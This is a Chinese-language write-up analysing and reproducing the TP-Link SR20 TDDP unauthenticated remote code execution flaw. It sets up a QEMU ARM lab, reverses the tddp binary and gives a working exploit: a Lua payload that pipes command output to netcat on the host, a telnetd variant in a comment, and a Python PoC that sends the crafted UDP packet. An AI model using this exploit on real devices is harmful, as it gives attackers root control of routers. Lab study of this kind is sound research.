TP-Link SR20 是一款支持 Zigbee 和 Z-Wave 物联网协议可以用来当控制中枢 Hub 的触屏 Wi-Fi
路由器，此远程代码执行漏洞允许用户在设备上以 root 权限执行任意命令，该漏洞存在于 TP-Link 设备调试协议(TP-Link Device
Debug Protocol 英文简称 TDDP) 中，TDDP 是 TP-Link 申请了专利的调试协议，基于 UDP 运行在 1040 端口。

TP-Link SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040
端口发送数据，且数据的第二字节为 0x31 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root
权限来执行，这就导致存在远程代码执行漏洞。

##  **01** 搭建环境

以下所有操作都在Ubuntu LTS 18.04系统下进行

### 安装编译QEMU

Qemu 是纯以GPL许可证分发源码的模拟处理器，在GNU/Linux平台上使用广泛。几乎可以模拟任何硬件设备。

从 QEMU 官网下载最新稳定版源码来编译安装

    
    
    wget https://download.qemu.org/qemu-3.1.0.tar.xz # 下载源码
    
    tar xvJf qemu-4.0.0-rc1.tar.xz #解压源码压缩包
    
    cd qemu-4.0.0-rc1 # 进入源码目录
    
    ./configure --target-list=arm-softmmu --audio-drv-list=alsa,pa # 编译前配置
    
    make # 编译

如果 configure 时没有指定 target-list参数，make 会编译针对所有平台的 QEMU 导致会耗很长很长的时间，因此可以选择只编译
ARM 版的 QEMU 来加快编译速度，至于选择 ARM 版是因为 TP-Link SR20 存在漏洞的固件基于是 ARM 架构，下文中会看到。

编译完成后安装 checkinstall 来生成 deb 包

    
    
    sudo apt-get install checkinstall # 安装 checkinstall
    
    sudo checkinstall make install    # 使用 checkinstall 生成 deb 包并安装

如果不使用 checkinstall，直接sudo make install的会把 qemu 安装在多个位置，如果发生错误不方便删除，所以使用
checkinstall 生成 deb 包方便安装和卸载。

安装完成后可以看到安装的版本

![603001c6c8aa820f1c997c23fb618083-sz_23565.png](https://image.3001.net/images/20201117/1605601025.png!small)

 **安装 Binwalk**

Binwalk 是一款文件的分析工具，旨在协助研究人员对文件进行分析，提取及逆向工程

    
    
    sudo apt install git
    
    git clone https://github.com/ReFirmLabs/binwalk
    
    cd binwalk
    
    python setup.py install
    
    sudo ./deps.sh $ Debian/Ubuntu 系统用户可以直接使用 deps.sh 脚本安装所有的依赖

更详细的安装方法可以查看 Binwalk 的 GitHub wiki

https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md

最后运行deps.sh安装依赖时，cramfstools 编译出错导致安装失败，可以不用理会。

 **固件提取**

从 TP-Link SR20 设备官网下载固件：https://www.tp-link.com/us/support/download/sr20/#Firmware

选择SR20(US)_V1_180518进行下载解压得到tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin固件。

![v2-cdad3bfe11cfe984d67c5b90b2c1b4b7_720w.jpg](https://image.3001.net/images/20201118/1605665816.jpg!small)

使用binwalk查看固件信息

    
    
    binwalk -Me tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin

![7d95e267aa4846fe87b41a3775ff93cb-sz_40015.png](https://image.3001.net/images/20201117/1605601026.png!small)

binwalk 会在当前目录的 _+bin文件名 目录下生成提取出来的固件里的所有内容，进入到该目录

![7f33d1b2153519e026ab29cb83eca685-sz_77064.png](https://image.3001.net/images/20201117/1605601026.png!small)

squashfs-root 目录就是我们需要的固件文件系统

![ace64f111d66ee6fbed12bac225ff32f-sz_86255.png](https://image.3001.net/images/20201117/1605601027.png!small)

在该文件系统目录下查找存在漏洞的 tddp 文件并查看文件类型可以看到该文件是一个 ARM 架构的小端32 位 ELF 文件。

最高有效位 MSB 对应大端，最低有效位 LSB对应小端。

https://www.cnblogs.com/endure/p/3425140.html（相关知识）

![95027ae3d8af323faccb197318cfde1c-sz_27347.png](https://image.3001.net/images/20201117/1605601028.png!small)

经过测试发现通过这种方式运行 TDDP 程序并不能触发该漏洞，因此需要搭建完整的 ARM QEMU 虚拟机环境。

 **搭建ARM QEMU虚拟环境**

从 Debian 官网（https://people.debian.org/~aurel32/qemu/armhf/）下载 QEMU 需要的 Debian
ARM 系统的三个文件:

    
    
    · debian_wheezy_armhf_standard.qcow2 2013-12-17
    
    · 00:04 229Minitrd.img-3.2.0-4-vexpress 2013-12-17 01:57
    
    · 2.2Mvmlinuz-3.2.0-4-vexpress 2013-09-20 18:33 1.9M

把以上三个文件放在同一目录下，并执行以下命令

    
    
    sudo tunctl -t tap0 -u iot  # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡，iot为本机名字
    
    sudo ifconfig tap0 10.10.10.1/24 # 为添加的虚拟网卡配置 IP 地址
    
    qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2 console=ttyAMA0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic

虚拟机启动成功后会提示登陆

![b954db9e22726cf770ad78c88b28d46f-sz_85177.png](https://image.3001.net/images/20201117/1605601029.png!small)

输入用户名和密码：root登录

![fa6b0ce915953258ed32844054c861c4-sz_54452.png](https://image.3001.net/images/20201117/1605601029.png!small)

配置网卡IP

    
    
    ifconfig eth0 10.10.10.2/24

![455111683647093a976393c54c46ad3c-sz_73791.png](https://image.3001.net/images/20201117/1605601030.png!small)

此时 QEMU 虚拟机可以与宿主机进行网络通信

现在需要把从固件中提取出的文件系统打包后上传到 QEMU 虚拟机中

压缩固件文件系统目录下的整个文件

    
    
    tar -cjpf squashfs-root.tar.bz2 squashfs-root/

![3acdae8def413f9e94a457df937cd8e7-sz_25765.png](https://image.3001.net/images/20201117/1605601031.png!small)

使用 Python 搭建简易 HTTP Server

    
    
    python -m SimpleHTTPServer

![73673dc4e092c22ee8f481eadc31f580-sz_8241.png](https://image.3001.net/images/20201117/1605601031.png!small)

在 QEMU 虚拟机中下载上面打包好的文件

    
    
    wget http://10.10.10.1:8000/squashfs-root.tar.bz2

![4d149914883d38e8aa852706451df60f-sz_50718.png](https://image.3001.net/images/20201117/1605601032.png!small)

使用 chroot 切换根目录固件文件系统

    
    
    tar -xjf squashfs-root.tar.bz2
    
    mount -o bind /dev ./squashfs-root/dev/
    
    mount -t proc /proc/ ./squashfs-root/proc/
    
    chroot squashfs-root sh 

# 切换根目录后执行新目录结构下的 sh shell

使用 chroot 后，系统读取的是新根下的目录和文件，也就是固件的目录和文件 chroot 默认不会切换 /dev 和 /proc,
因此切换根目录前需要现挂载这两个目录

![f174c9a7b6560da45d786b66d32c91cf-sz_60103.png](https://image.3001.net/images/20201117/1605601033.png!small)

搭建 TFTP Server

在宿主机安装 atftpd 搭建 TFTP 服务

    
    
    sudo apt install atftpd

  * 编辑 /etc/default/atftpd 文件，USE_INETD=true 改为 USE_INETD=false
  * 修改 /srv/tftp 为 /tftpboot

![f00b000883e5689013f7dfadf800d769-sz_18034.png](https://image.3001.net/images/20201117/1605601034.png!small)

执行命令

    
    
    mkdir /tftpboot
    
    chmod 777 /tftpboot
    
    sudo systemctl start atftpd # 启动 atftpd
    
    sudo systemctl status atftpd # 查看 atftpd 服务状态

![c7bdbc6c787129d9ee8185f19c3cdcd2-sz_78731.png](https://image.3001.net/images/20201117/1605601035.png!small)

环境搭建完毕

##  **02** TDDP协议漏洞的逆向研究

使用IDA对该协议漏洞进行逆向分析。

### 过程

使用binwalk将固件中的文件提取出来，将squashfs-root下的/usr/bin目录下的tddp程序放入IDA中加载。

通过反编译分析，找到main函数为sub_971C，在main函数中，可推测sub_16C90函数是用来获取v4值的，继续看下面的函数，可预估函数sub_936C是关键函数。

![v2-e40cb2a4d55692756f3f46411ec080d2_720w.jpg](https://image.3001.net/images/20201118/1605665816.jpg!small)

跟进sub_936C函数，在18行出可以看到输出了tddp task
start，确认进入到了关键函数中，可以看到，在20到23行应该是进行了内存初始化以及socket的初始化，将套接字绑定到了1040端口。

![be1f8cf2f4b68a78ff3d39a5c120a4b6-sz_31132.png](https://image.3001.net/images/20201117/1605601036.png!small)

接着看该函数的后边，看到在55行if处判定为真时，使用了函数sub_16418，猜测该函数是关键函数。

![d744a99dba03d35447449e03c6666040-sz_26322.png](https://image.3001.net/images/20201117/1605601036.png!small)

跟进该函数，在32行处发现使用了recvfrom函数，该函数是从套接口上接收数据，并捕获数据发送源的地址。且在poc中也使用了该函数从套接口接收数据，所以判定正确进入了关键函数。

接着看在32行变量v18使用recvfrom接收了套接口的数据，从(char*)v14的45083偏移处取的数据。

![30d4f5431d1ca7044029368da18cebb3-sz_26976.png](https://image.3001.net/images/20201117/1605601037.png!small)

继续看后边，在取得套接口的数据存在v18后，变量v2也取的地址v20,v20取(char*)v14的45083偏移处取的数据，从recvfrom函数猜测(char*)v14的45083偏移处取的数据是对应TDDP协议的第一个字节。

根据TDDP协议存在两个版本，该协议规定第一个字节处为version，即版本。而该协议存在漏洞的版本是version为1的时候，不需要进行身份的认证即可对设备进行调试。得出在38行对v2，即TDDP协议第一个字节处的version进行判断是否为1时，判断正确后下边执行的函数中存在关键函数。

 **此处猜测sub_9340是关键函数。**

![079f2f4ef71f52bfba1cfeab25cc6ed4-sz_34292.png](https://image.3001.net/images/20201117/1605601038.png!small)

跟进函数sub_9340,发现是使用了gettimeofday函数来获取当前时间，则判定该函数非关键函数，退回到上一函数sub_16418，
**猜测函数sub_15E74为关键函数。**

![v2-ca45b8e8ecd81ae036fcb6896790fbad_720w.jpg](https://image.3001.net/images/20201118/1605665817.jpg!small)

跟进sub_15E74函数，发现在该函数中输出了receive CMD_AUTO_TEST，猜测在该函数中调用了命令执行，判定进入了正确的关键函数。

![preview](https://image.3001.net/images/20201118/1605665818.jpg!small)

本来switch下的每一个case都应该查看分析的，但因为知道了存在漏洞的case在0x31处，所以直接分析case 0x31处的情况。

在85行就break了，所以可以锁定关键函数步骤出现在sub_A580函数处。

![549bf4f1839d15b8e65bae4015edb640-sz_19032.png](https://image.3001.net/images/20201117/1605601039.png!small)

跟进sub_A580函数，在变量中可以看到v8从a1，v19获取了(char*)v8的45083偏移处取的数据，即从套接口获取的数据

![d5e1af5f6eb899c5dbb69a8c3439ca75-sz_12231.png](https://image.3001.net/images/20201117/1605601040.png!small)

继续看下边，在57行处，使用了sscanf对v19，即套机口得到的数据，用分号进行了分隔，再传入s与v10中。

在65行处，使用了inet_ntoa函数，猜测此处即是获取了ip地址再用点隔成字符串格式给了v16。

紧接着下边函数sub_91DC就使用了tftp从s和v16拼接成的数据作为地址进行了连接和下载相应文件的操作。

将下载的文件名字与/tmp进行拼接，变为/tmp/下载文件名存入&name中。

![2be6903fdd34bca055ee3f0d7a316f78-sz_26643.png](https://image.3001.net/images/20201117/1605601040.png!small)

接着在83行处，使用luaL_loadfile从&name处加载调用了lua脚本。

![dc45610579311c5bd78daea23abbe108-sz_20081.png](https://image.3001.net/images/20201117/1605601041.png!small)

进入sub_91DC函数进行查看，通过分析，可以确定此处使用了execve执行了命令，可确定就是此处可构成命令执行。

![f08eb888c66be7e13e32d22904379768-sz_27809.png](https://image.3001.net/images/20201117/1605601042.png!small)

至此，TDDP协议漏洞分析结束。

##  **03** 漏洞复现

在 atftp 的根目录 /tftpboot 下写入 payload
文件。因此处无tftpboot目录，所以直接在根目录下创建一个tftpboot目录，以便后续操作。

在tftpboot目录下写入payload文件。payload 文件内容为：

function config_test(config)

os.execute("id | nc 10.10.10.1 1337")

end

![v2-8bf143a49067c70c401be83a4d5a46ba_720w.jpg](https://image.3001.net/images/20201119/1605752320.jpg!small)

将poc拷贝进tftpboot目录下

Poc代码：

    
    
    #!/usr/bin/python3
    
     
    
    # Copyright 2019 Google LLC.
    
    # SPDX-License-Identifier: Apache-2.0
    
     
    
    # Create a file in your tftp directory with the following contents:
    
    #
    
    #function config_test(config)
    
    # os.execute("telnetd -l /bin/login.sh")
    
    #end
    
    #
    
    # Execute script as poc.py remoteaddr filename
    
     
    
    import sys
    
    import binascii
    
    import socket
    
     
    
    port_send = 1040
    
    port_receive = 61000
    
     
    
    tddp_ver = "01"
    
    tddp_command = "31"
    
    tddp_req = "01"
    
    tddp_reply = "00"
    
    tddp_padding = "%0.16X" % 00
    
     
    
    tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])
    
     
    
    sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    sock_receive.bind(('', port_receive))
    
     
    
    # Send a request
    
    sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    packet = binascii.unhexlify(tddp_packet)
    
    argument = "%s;arbitrary" % sys.argv[2]
    
    packet = packet + argument.encode()
    
    sock_send.sendto(packet, (sys.argv[1], port_send))
    
    sock_send.close()
    
     
    
    response, addr = sock_receive.recvfrom(1024)
    
    r = response.encode('hex')
    
    print(r)

复现步骤为：

1.QEMU 虚拟机中启动 tddp 程序

![a8487308dc4a68624a5ae2e2e49aedaa-sz_7492.png](https://image.3001.net/images/20201117/1605601043.png!small)

2.宿主机使用 NC 监听端口

![6aae4e7058d56d8d070717c2564f3b77-sz_17019.png](https://image.3001.net/images/20201117/1605601043.png!small)

3.执行 POC

![3263fe09ca5fa4dfe31cebd35a80fce7-sz_8966.png](https://image.3001.net/images/20201117/1605601044.png!small)

获取命令执行结果

![d74e9824271fcccc00b360abd1e57195-sz_23156.png](https://image.3001.net/images/20201117/1605601044.png!small)

  

